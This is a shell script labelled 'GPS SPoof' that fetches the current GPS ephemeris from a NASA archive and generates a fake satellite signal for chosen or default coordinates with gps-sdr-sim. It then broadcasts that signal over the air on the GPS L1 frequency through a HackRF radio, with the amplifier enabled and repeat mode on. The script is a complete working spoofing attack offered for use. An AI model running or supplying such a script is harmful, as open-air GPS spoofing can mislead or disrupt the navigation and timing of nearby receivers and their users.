#!/bin/sh
day=$(date +%j)
year=$(date +%Y)
yr=$(date +%y)
RED='\033[1;37m'
NC='\033[0m' 
toilet "GPS SPoof"

echo "### enter coordinate... [enter for default]"

read  loc

if [ -z "$loc" ]
then
       export loki="45.47793738796684,9.121902061311296,100"
else 
	export loki=$loc
	
fi

echo  "\n ${RED} use loc $loki ${NC}"

rm "brdc""$day""0.$yr""n"

curl -c /tmp/cookie -n -L -o "brdc""$day""0.$yr""n.Z" "https://cddis.nasa.gov/archive/gnss/data/daily/$year""/brdc/brdc""$day""0.$yr""n.Z"

uncompress "brdc""$day""0.$yr""n.Z"
echo "\n ${RED} brdc""$day""0.$yr""n.Z ${NC}"

echo "\n ${RED} remove old bin file ${NC}"
rm gpssim.bin

echo "\n ${RED} generate new bin file... ${NC}"

./gps-sdr-sim -e "brdc""$day""0.$yr""n" -l $loki -s 2600000 -d 100 -b 8


echo "\n ${RED} check hackrf TCXO; 0x01 = tcxo installed ${NC}"

#hackrf_si5351c -n 0 -r
hackrf_debug --si5351c -n 0 -r 

echo "\n ${RED} transmitting... ${NC}"

hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0 -R 1
#hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0
